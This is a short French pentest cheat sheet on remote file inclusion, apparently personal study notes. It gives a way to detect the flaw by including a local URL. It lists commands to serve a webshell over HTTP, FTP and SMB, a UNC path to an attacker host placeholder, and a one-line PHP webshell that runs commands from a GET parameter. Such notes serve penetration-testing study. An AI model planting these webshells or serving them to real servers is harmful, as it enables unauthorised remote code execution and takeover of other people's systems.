# Détection
Essayer d'inclure un URL local en premier (http://127.0.0.1:80/index.php)
Regarder si le fichier est affiché en code exécuté

# Webshells
servir un webshell par divers protocoles HTTP, FTP, SMB
```shell
sudo python3 -m http.server 80
sudo python -m pyftpdlib -p 21
impacket-smbserver -smb2support share $(pwd)
```

si sur Windows, peut utiliser SMB, donc pas besoin de allow_url_include. Mais peut ne pas être permis vers un réseau externe
\\\\<OUR_IP>\share\shell.php
```shell
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```
/usr/share/webshells/(php, ...)